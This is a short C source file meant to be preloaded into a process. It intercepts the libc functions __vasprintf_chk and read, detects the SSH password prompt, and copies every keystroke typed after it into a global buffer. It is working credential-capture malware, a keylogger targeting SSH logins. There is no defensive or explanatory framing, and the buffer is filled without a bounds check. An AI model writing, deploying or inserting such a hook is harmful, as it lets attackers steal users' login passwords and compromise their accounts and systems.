#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

#define PASSWORD_READ_DETECTED 1
#define PASSWORD_READ_FMT "%s@%s's password: "
#define PASSWORD_MAX_LEN 1024

int password_read_detected = 0;
char password[PASSWORD_MAX_LEN];
char *cur = password;

// password reading detection
int __vasprintf_chk (char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg) {
    if (0 == strcmp(__fmt, PASSWORD_READ_FMT)) {
        password_read_detected = PASSWORD_READ_DETECTED;
    }
    int (*__vasprintf_chk_libc)(char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg);
    __vasprintf_chk_libc = dlsym(RTLD_NEXT, "__vasprintf_chk");
    return __vasprintf_chk_libc(__ptr, __flag, __fmt, __arg);
}

// password reading
ssize_t read (int __fd, void *__buf, size_t __nbytes) {
    ssize_t (*read_libc)(int __fd, const void *__buf, size_t __nbytes);
    ssize_t result;
    read_libc = dlsym(RTLD_NEXT, "read");
    result = read_libc(__fd, __buf, __nbytes);
    if (PASSWORD_READ_DETECTED == password_read_detected) {
        if ('\n' == *(char*)__buf) {
            password_read_detected = 0;
        }
        else {
            *cur = *(char*)__buf;
            cur++;
        }
    }
    return result;
}